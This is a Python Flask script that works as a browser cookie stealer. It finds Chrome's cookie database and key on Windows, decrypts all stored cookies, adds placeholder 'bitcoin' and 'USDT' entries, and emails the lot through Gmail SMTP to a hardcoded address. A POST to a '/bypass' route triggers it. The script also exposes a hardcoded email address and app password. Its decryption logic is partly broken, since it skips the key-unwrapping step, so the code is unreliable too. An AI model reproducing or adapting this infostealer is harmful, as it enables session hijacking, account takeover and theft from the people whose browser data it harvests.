import os
import sqlite3
import json
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from flask import Flask, jsonify, request, send_from_directory

# Flask app setup
app = Flask(__name__)

# Helper function to get the Chrome Local State file path (Only for Windows)
def get_local_state_path():
    if os.name == "nt":
        # Ensure LOCALAPPDATA is available
        local_app_data = os.environ.get("LOCALAPPDATA")
        if local_app_data:
            return os.path.join(local_app_data, "Google", "Chrome", "User Data", "Local State")
    return None  # Only supporting Windows for now

# Extract the encryption key from the Local State file
def get_encryption_key():
    local_state_path = get_local_state_path()
    if not local_state_path or not os.path.exists(local_state_path):
        raise Exception(f"Local State file not found at {local_state_path}. Please ensure Chrome is installed and the path is correct.")
    
    with open(local_state_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        encryption_key_b64 = data['os_crypt']['encrypted_key']
        
        # Decrypt the encryption key
        encryption_key = base64.b64decode(encryption_key_b64)[5:]  # Remove the "v10" prefix
        return encryption_key

# Decrypt the cookie value
def decrypt_cookie_value(encrypted_value, encryption_key):
    nonce = encrypted_value[3:15]
    cipher_text = encrypted_value[15:-16]
    tag = encrypted_value[-16:]
    
    cipher = Cipher(algorithms.AES(encryption_key), modes.GCM(nonce), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_value = decryptor.update(cipher_text) + decryptor.finalize()
    
    return decrypted_value.decode('utf-8', errors='ignore')

# Get Chrome cookies
def get_chrome_cookies():
    cookies_path = get_chrome_cookies_path()
    
    if not cookies_path or not os.path.exists(cookies_path):
        raise Exception(f"Cookies file not found at {cookies_path}. Please ensure Chrome is installed and the path is correct.")
    
    encryption_key = get_encryption_key()
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, encrypted_value FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    
    decrypted_cookies = []
    for cookie in cookies:
        cookie_name = cookie[0]
        encrypted_value = cookie[1]
        decrypted_value = decrypt_cookie_value(encrypted_value, encryption_key)
        decrypted_cookies.append({"name": cookie_name, "value": decrypted_value})
    
    return decrypted_cookies

# Get paths for Chrome's SQLite databases
def get_chrome_cookies_path():
    if os.name == "nt":
        # Check various paths where Chrome might be installed
        potential_paths = [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join(os.environ.get("PROGRAMDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join(os.environ.get("APPDATA", ""), "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join("C:", "Program Files", "Google", "Chrome", "User Data", "Default", "Cookies"),
            os.path.join("C:", "Program Files (x86)", "Google", "Chrome", "User Data", "Default", "Cookies")
        ]
        
        for path in potential_paths:
            if os.path.exists(path):
                return path
    return None  # Return None if no path is found

# Fetch Bitcoin and USDT cookies (modify this logic as needed)
def get_bitcoin_cookies():
    bitcoin_cookies = [{"name": "bitcoin_cookie", "value": "example_bitcoin_value"}]
    return bitcoin_cookies

def get_usdt_cookies():
    usdt_cookies = [{"name": "usdt_cookie", "value": "example_usdt_value"}]
    return usdt_cookies

# Send data via email using Python's smtplib
def send_email_via_smtp(cookies_data):
    # Email configuration
    from_email = "paulmotil235@gmail.com"  # Replace with your email
    to_email = "paulmotil235@gmail.com"  # Replace with recipient's email
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "paulmotil235@gmail.com"  # Your email username
    smtp_password = "pvsrvdvheqeeedid"  # Your email password or app password
    
    # Create the email content
    email_body = f"Cookies Data:\n\n{json.dumps(cookies_data, indent=4)}"
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Chrome Cookies Data"
    msg.attach(MIMEText(email_body, 'plain'))
    
    # Connect to the SMTP server and send email
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure the connection
        server.login(smtp_username, smtp_password)  # Log in to the server
        server.sendmail(from_email, to_email, msg.as_string())  # Send email
        server.quit()  # Disconnect from the server
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Serve HTML file on GET request to root path
@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/bypass', methods=['POST'])
def bypass_cors_sors():
    try:
        # Retrieve cookies and other data
        chrome_cookies = get_chrome_cookies()
        bitcoin_cookies = get_bitcoin_cookies()
        usdt_cookies = get_usdt_cookies()

        # Combine all cookie data into one dictionary
        data = {
            "chrome_cookies": chrome_cookies,
            "bitcoin_cookies": bitcoin_cookies,
            "usdt_cookies": usdt_cookies
        }

        # Log the data being collected for debugging
        print(f"Collected Data: {json.dumps(data, indent=4)}")

        # Send the collected data via email using Python's smtplib
        send_email_via_smtp(data)

        return jsonify({"message": "Data retrieved and sent successfully", "data": data}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
